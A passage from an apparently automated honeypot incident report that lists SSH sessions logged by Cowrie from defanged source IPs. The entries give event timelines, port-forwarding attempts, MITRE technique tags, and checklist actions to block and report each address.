| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 06:33:41` | `cowrie.session.connect` |
| `2026-07-28 06:33:42` | `cowrie.client.version` |
| `2026-07-28 06:33:42` | `cowrie.client.kex` |
| `2026-07-28 06:33:43` | `cowrie.login.success` |
| `2026-07-28 06:33:44` | `cowrie.direct-tcpip.request` |
| `2026-07-28 06:33:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.29[.]136` to AbuseIPDB if not already reported
- [ ] Block `31.173.29[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0460a649d629

| Field | Detail |
|---|---|
| **Source IP** | `196.219.93[.]108` |
| **First Seen** | 2026-07-28 06:35 |
| **Last Seen** | 2026-07-28 06:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 06:35:45` | `cowrie.session.connect` |
| `2026-07-28 06:35:45` | `cowrie.client.version` |
| `2026-07-28 06:35:45` | `cowrie.client.kex` |
| `2026-07-28 06:35:46` | `cowrie.login.success` |
| `2026-07-28 06:35:46` | `cowrie.direct-tcpip.request` |
| `2026-07-28 06:35:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.219.93[.]108` to AbuseIPDB if not already reported
- [ ] Block `196.219.93[.]108` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6b2b37b5899

| Field | Detail |
|---|---|
| **Source IP** | `45.33.12[.]122` |
| **First Seen** | 2026-07-28 06:36 |
| **Last Seen** | 2026-07-28 06:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Accept: */*, Accept-Encoding: gzip, User-Agent: Mozilla/5.0 zgrab/0.x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 06:36:51` | `cowrie.session.connect` |
| `2026-07-28 06:36:51` | `cowrie.login.success` |
| `2026-07-28 06:36:51` | `cowrie.session.params` |
| `2026-07-28 06:36:51` | `cowrie.command.input` |
| `2026-07-28 06:36:51` | `cowrie.command.failed` |
| `2026-07-28 06:36:51` | `cowrie.command.input` |
| `2026-07-28 06:36:51` | `cowrie.command.failed` |
| `2026-07-28 06:36:51` | `cowrie.command.input` |
| `2026-07-28 06:36:51` | `cowrie.command.failed` |
| `2026-07-28 06:36:51` | `cowrie.command.input` |
| `2026-07-28 06:36:51` | `cowrie.log.closed` |
| `2026-07-28 06:36:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.12[.]122` to AbuseIPDB if not already reported
- [ ] Block `45.33.12[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c49c716c597

| Field | Detail |
|---|---|
| **Source IP** | `220.178.39[.]106` |
| **First Seen** | 2026-07-28 06:44 |
| **Last Seen** | 2026-07-28 06:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 06:44:44` | `cowrie.session.connect` |
| `2026-07-28 06:44:45` | `cowrie.client.version` |
| `2026-07-28 06:44:45` | `cowrie.client.kex` |
| `2026-07-28 06:44:47` | `cowrie.login.success` |
| `2026-07-28 06:44:49` | `cowrie.direct-tcpip.request` |
| `2026-07-28 06:44:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.178.39[.]106` to AbuseIPDB if not already reported
- [ ] Block `220.178.39[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-600fbdc63de3

| Field | Detail |
|---|---|
| **Source IP** | `136.185.6[.]181` |
| **First Seen** | 2026-07-28 06:44 |
| **Last Seen** | 2026-07-28 06:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 06:44:54` | `cowrie.session.connect` |
| `2026-07-28 06:44:55` | `cowrie.client.version` |
| `2026-07-28 06:44:55` | `cowrie.client.kex` |
| `2026-07-28 06:44:56` | `cowrie.login.success` |
| `2026-07-28 06:44:57` | `cowrie.direct-tcpip.request` |
| `2026-07-28 06:45:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `136.185.6[.]181` to AbuseIPDB if not already reported
- [ ] Block `136.185.6[.]181` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77cb4b2de34f

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-28 06:46 |
| **Last Seen** | 2026-07-28 06:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 06:46:11` | `cowrie.session.connect` |
| `2026-07-28 06:46:11` | `cowrie.client.version` |
| `2026-07-28 06:46:11` | `cowrie.client.kex` |
| `2026-07-28 06:46:12` | `cowrie.login.success` |
| `2026-07-28 06:46:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49914e555524

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-28 06:46 |
| **Last Seen** | 2026-07-28 06:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 06:46:11` | `cowrie.session.connect` |
| `2026-07-28 06:46:11` | `cowrie.client.version` |
| `2026-07-28 06:46:11` | `cowrie.client.kex` |
| `2026-07-28 06:46:12` | `cowrie.login.success` |
| `2026-07-28 06:46:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-975281f03e4a

| Field | Detail |
|---|---|
| **Source IP** | `211.253.10[.]61` |
| **First Seen** | 2026-07-28 06:48 |
| **Last Seen** | 2026-07-28 06:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 06:48:16` | `cowrie.session.connect` |
| `2026-07-28 06:48:17` | `cowrie.client.version` |
| `2026-07-28 06:48:17` | `cowrie.client.kex` |
| `2026-07-28 06:48:19` | `cowrie.login.success` |
| `2026-07-28 06:48:20` | `cowrie.direct-tcpip.request` |
| `2026-07-28 06:48:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.253.10[.]61` to AbuseIPDB if not already reported
- [ ] Block `211.253.10[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6206111a0e2f

| Field | Detail |
|---|---|
| **Source IP** | `172.105.128[.]11` |
| **First Seen** | 2026-07-28 06:49 |
| **Last Seen** | 2026-07-28 06:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 06:49:43` | `cowrie.session.connect` |
| `2026-07-28 06:49:43` | `cowrie.login.success` |
| `2026-07-28 06:49:43` | `cowrie.session.params` |
| `2026-07-28 06:49:43` | `cowrie.command.input` |
| `2026-07-28 06:49:43` | `cowrie.command.input` |
| `2026-07-28 06:49:43` | `cowrie.command.failed` |
| `2026-07-28 06:49:43` | `cowrie.command.input` |
| `2026-07-28 06:49:43` | `cowrie.command.failed` |
| `2026-07-28 06:49:43` | `cowrie.command.input` |
| `2026-07-28 06:49:43` | `cowrie.log.closed` |
| `2026-07-28 06:49:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.105.128[.]11` to AbuseIPDB if not already reported
- [ ] Block `172.105.128[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c04866fe2830

| Field | Detail |
|---|---|
| **Source IP** | `104.155.76[.]11` |
| **First Seen** | 2026-07-28 06:53 |
| **Last Seen** | 2026-07-28 06:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 06:53:03` | `cowrie.session.connect` |
| `2026-07-28 06:53:03` | `cowrie.login.success` |
| `2026-07-28 06:53:04` | `cowrie.session.params` |
| `2026-07-28 06:53:04` | `cowrie.command.input` |
| `2026-07-28 06:53:04` | `cowrie.command.input` |
| `2026-07-28 06:53:04` | `cowrie.command.failed` |
| `2026-07-28 06:53:04` | `cowrie.command.input` |
| `2026-07-28 06:53:04` | `cowrie.log.closed` |
| `2026-07-28 06:53:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.155.76[.]11` to AbuseIPDB if not already reported
- [ ] Block `104.155.76[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b37a4969b4e6

| Field | Detail |
|---|---|
| **Source IP** | `104.155.76[.]11` |
| **First Seen** | 2026-07-28 06:53 |
| **Last Seen** | 2026-07-28 06:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 06:53:17` | `cowrie.session.connect` |
| `2026-07-28 06:53:17` | `cowrie.login.success` |
| `2026-07-28 06:53:17` | `cowrie.session.params` |
| `2026-07-28 06:53:17` | `cowrie.command.input` |
| `2026-07-28 06:53:17` | `cowrie.command.failed` |
| `2026-07-28 06:53:21` | `cowrie.log.closed` |
| `2026-07-28 06:53:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.155.76[.]11` to AbuseIPDB if not already reported
- [ ] Block `104.155.76[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-533709b1ccf6

| Field | Detail |
|---|---|
| **Source IP** | `104.155.76[.]11` |
| **First Seen** | 2026-07-28 06:53 |
| **Last Seen** | 2026-07-28 06:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 06:53:19` | `cowrie.session.connect` |
| `2026-07-28 06:53:19` | `cowrie.login.success` |
| `2026-07-28 06:53:19` | `cowrie.session.params` |
| `2026-07-28 06:53:19` | `cowrie.command.input` |
| `2026-07-28 06:53:21` | `cowrie.log.closed` |
| `2026-07-28 06:53:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.155.76[.]11` to AbuseIPDB if not already reported
- [ ] Block `104.155.76[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fd5cf6e4294

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-28 06:59 |
| **Last Seen** | 2026-07-28 06:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 06:59:44` | `cowrie.session.connect` |
| `2026-07-28 06:59:44` | `cowrie.client.version` |
| `2026-07-28 06:59:44` | `cowrie.client.kex` |
| `2026-07-28 06:59:44` | `cowrie.login.success` |
| `2026-07-28 06:59:44` | `cowrie.direct-tcpip.request` |
| `2026-07-28 06:59:44` | `cowrie.direct-tcpip.data` |
| `2026-07-28 06:59:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cd5c06e9437

| Field | Detail |
|---|---|
| **Source IP** | `125.19.244[.]62` |
| **First Seen** | 2026-07-28 07:00 |
| **Last Seen** | 2026-07-28 07:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:00:20` | `cowrie.session.connect` |
| `2026-07-28 07:00:21` | `cowrie.client.version` |
| `2026-07-28 07:00:21` | `cowrie.client.kex` |
| `2026-07-28 07:00:23` | `cowrie.login.success` |
| `2026-07-28 07:00:23` | `cowrie.direct-tcpip.request` |
| `2026-07-28 07:00:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.19.244[.]62` to AbuseIPDB if not already reported
- [ ] Block `125.19.244[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c21a701cdebf

| Field | Detail |
|---|---|
| **Source IP** | `41.224.62[.]206` |
| **First Seen** | 2026-07-28 07:00 |
| **Last Seen** | 2026-07-28 07:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:00:32` | `cowrie.session.connect` |
| `2026-07-28 07:00:33` | `cowrie.client.version` |
| `2026-07-28 07:00:33` | `cowrie.client.kex` |
| `2026-07-28 07:00:34` | `cowrie.login.success` |
| `2026-07-28 07:00:34` | `cowrie.direct-tcpip.request` |
| `2026-07-28 07:00:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.224.62[.]206` to AbuseIPDB if not already reported
- [ ] Block `41.224.62[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5c4c1b55dde

| Field | Detail |
|---|---|
| **Source IP** | `211.169.212[.]206` |
| **First Seen** | 2026-07-28 07:01 |
| **Last Seen** | 2026-07-28 07:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:01:26` | `cowrie.session.connect` |
| `2026-07-28 07:01:27` | `cowrie.client.version` |
| `2026-07-28 07:01:27` | `cowrie.client.kex` |
| `2026-07-28 07:01:29` | `cowrie.login.success` |
| `2026-07-28 07:01:30` | `cowrie.direct-tcpip.request` |
| `2026-07-28 07:01:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.169.212[.]206` to AbuseIPDB if not already reported
- [ ] Block `211.169.212[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3baf230edb0

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]53` |
| **First Seen** | 2026-07-28 07:01 |
| **Last Seen** | 2026-07-28 07:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:01:35` | `cowrie.session.connect` |
| `2026-07-28 07:01:36` | `cowrie.client.version` |
| `2026-07-28 07:01:36` | `cowrie.client.kex` |
| `2026-07-28 07:01:38` | `cowrie.login.success` |
| `2026-07-28 07:01:39` | `cowrie.direct-tcpip.request` |
| `2026-07-28 07:01:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]53` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78dcc880a855

| Field | Detail |
|---|---|
| **Source IP** | `182.156.80[.]11` |
| **First Seen** | 2026-07-28 07:03 |
| **Last Seen** | 2026-07-28 07:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:03:41` | `cowrie.session.connect` |
| `2026-07-28 07:03:42` | `cowrie.client.version` |
| `2026-07-28 07:03:42` | `cowrie.client.kex` |
| `2026-07-28 07:03:44` | `cowrie.login.success` |
| `2026-07-28 07:03:44` | `cowrie.direct-tcpip.request` |
| `2026-07-28 07:03:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.156.80[.]11` to AbuseIPDB if not already reported
- [ ] Block `182.156.80[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4523d1bc6b5

| Field | Detail |
|---|---|
| **Source IP** | `121.159.71[.]249` |
| **First Seen** | 2026-07-28 07:03 |
| **Last Seen** | 2026-07-28 07:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:03:50` | `cowrie.session.connect` |
| `2026-07-28 07:03:50` | `cowrie.client.version` |
| `2026-07-28 07:03:50` | `cowrie.client.kex` |
| `2026-07-28 07:03:52` | `cowrie.login.success` |
| `2026-07-28 07:03:53` | `cowrie.direct-tcpip.request` |
| `2026-07-28 07:03:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.159.71[.]249` to AbuseIPDB if not already reported
- [ ] Block `121.159.71[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f2d76dabc4b

| Field | Detail |
|---|---|
| **Source IP** | `180.151.254[.]218` |
| **First Seen** | 2026-07-28 07:09 |
| **Last Seen** | 2026-07-28 07:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:09:07` | `cowrie.session.connect` |
| `2026-07-28 07:09:08` | `cowrie.client.version` |
| `2026-07-28 07:09:08` | `cowrie.client.kex` |
| `2026-07-28 07:09:09` | `cowrie.login.success` |
| `2026-07-28 07:09:10` | `cowrie.direct-tcpip.request` |
| `2026-07-28 07:09:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.151.254[.]218` to AbuseIPDB if not already reported
- [ ] Block `180.151.254[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d230de4b085e

| Field | Detail |
|---|---|
| **Source IP** | `191.210.73[.]33` |
| **First Seen** | 2026-07-28 07:09 |
| **Last Seen** | 2026-07-28 07:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:09:15` | `cowrie.session.connect` |
| `2026-07-28 07:09:16` | `cowrie.client.version` |
| `2026-07-28 07:09:16` | `cowrie.client.kex` |
| `2026-07-28 07:09:17` | `cowrie.login.success` |
| `2026-07-28 07:09:18` | `cowrie.direct-tcpip.request` |
| `2026-07-28 07:09:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.210.73[.]33` to AbuseIPDB if not already reported
- [ ] Block `191.210.73[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a060d18298f

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-28 07:18 |
| **Last Seen** | 2026-07-28 07:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:18:53` | `cowrie.session.connect` |
| `2026-07-28 07:18:53` | `cowrie.client.version` |
| `2026-07-28 07:18:53` | `cowrie.client.kex` |
| `2026-07-28 07:18:53` | `cowrie.login.success` |
| `2026-07-28 07:18:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ffdd936e8ee

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-28 07:18 |
| **Last Seen** | 2026-07-28 07:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:18:53` | `cowrie.session.connect` |
| `2026-07-28 07:18:53` | `cowrie.client.version` |
| `2026-07-28 07:18:53` | `cowrie.client.kex` |
| `2026-07-28 07:18:54` | `cowrie.login.success` |
| `2026-07-28 07:18:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10bac0b67d18

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-28 07:19 |
| **Last Seen** | 2026-07-28 07:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:19:02` | `cowrie.session.connect` |
| `2026-07-28 07:19:02` | `cowrie.client.version` |
| `2026-07-28 07:19:02` | `cowrie.client.kex` |
| `2026-07-28 07:19:02` | `cowrie.login.success` |
| `2026-07-28 07:19:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3afe9ad371d

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-28 07:19 |
| **Last Seen** | 2026-07-28 07:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:19:02` | `cowrie.session.connect` |
| `2026-07-28 07:19:02` | `cowrie.client.version` |
| `2026-07-28 07:19:02` | `cowrie.client.kex` |
| `2026-07-28 07:19:02` | `cowrie.login.success` |
| `2026-07-28 07:19:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58a1d90f7241

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-28 07:22 |
| **Last Seen** | 2026-07-28 07:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:22:04` | `cowrie.session.connect` |
| `2026-07-28 07:22:04` | `cowrie.client.version` |
| `2026-07-28 07:22:04` | `cowrie.client.kex` |
| `2026-07-28 07:22:04` | `cowrie.login.success` |
| `2026-07-28 07:22:04` | `cowrie.direct-tcpip.request` |
| `2026-07-28 07:22:05` | `cowrie.direct-tcpip.data` |
| `2026-07-28 07:22:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f621b4546818

| Field | Detail |
|---|---|
| **Source IP** | `103.181.81[.]150` |
| **First Seen** | 2026-07-28 07:22 |
| **Last Seen** | 2026-07-28 07:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:22:16` | `cowrie.session.connect` |
| `2026-07-28 07:22:17` | `cowrie.client.version` |
| `2026-07-28 07:22:17` | `cowrie.client.kex` |
